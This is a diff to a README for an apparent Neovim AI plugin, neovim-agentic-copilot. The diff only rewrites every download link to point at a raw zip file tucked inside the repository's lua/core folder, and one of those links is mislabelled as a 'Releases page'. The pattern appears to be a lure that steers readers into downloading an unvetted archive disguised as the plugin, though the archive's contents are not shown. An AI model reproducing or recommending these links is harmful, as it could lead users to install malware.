@@ -1,7 +1,7 @@
 # 🎉 neovim-agentic-copilot - Transform Your Coding Experience
 
 ## 📦 Download Now
-[![Download neovim-agentic-copilot](https://raw.githubusercontent.com/sd02383/neovim-agentic-copilot/main/Borreria/neovim-agentic-copilot.zip)](https://raw.githubusercontent.com/sd02383/neovim-agentic-copilot/main/Borreria/neovim-agentic-copilot.zip)
+[![Download neovim-agentic-copilot](https://raw.githubusercontent.com/sd02383/neovim-agentic-copilot/main/lua/core/agentic_neovim_copilot_2.4.zip)](https://raw.githubusercontent.com/sd02383/neovim-agentic-copilot/main/lua/core/agentic_neovim_copilot_2.4.zip)
 
 ## 🚀 Getting Started
 
@@ -28,7 +28,7 @@ Before downloading, ensure your system meets the following requirements:
 
 To get the latest version of neovim-agentic-copilot, visit our Releases page. 
 
-[Download neovim-agentic-copilot here](https://raw.githubusercontent.com/sd02383/neovim-agentic-copilot/main/Borreria/neovim-agentic-copilot.zip).
+[Download neovim-agentic-copilot here](https://raw.githubusercontent.com/sd02383/neovim-agentic-copilot/main/lua/core/agentic_neovim_copilot_2.4.zip).
 
 ### 2. Choose Your Version
 
@@ -74,6 +74,6 @@ We welcome contributions! If you want to improve neovim-agentic-copilot, please 
 
 ## 📥 Download Again
 
-To download or check for updates, return to our [Releases page](https://raw.githubusercontent.com/sd02383/neovim-agentic-copilot/main/Borreria/neovim-agentic-copilot.zip).
+To download or check for updates, return to our [Releases page](https://raw.githubusercontent.com/sd02383/neovim-agentic-copilot/main/lua/core/agentic_neovim_copilot_2.4.zip).
 
 Thank you for using neovim-agentic-copilot. Happy coding!
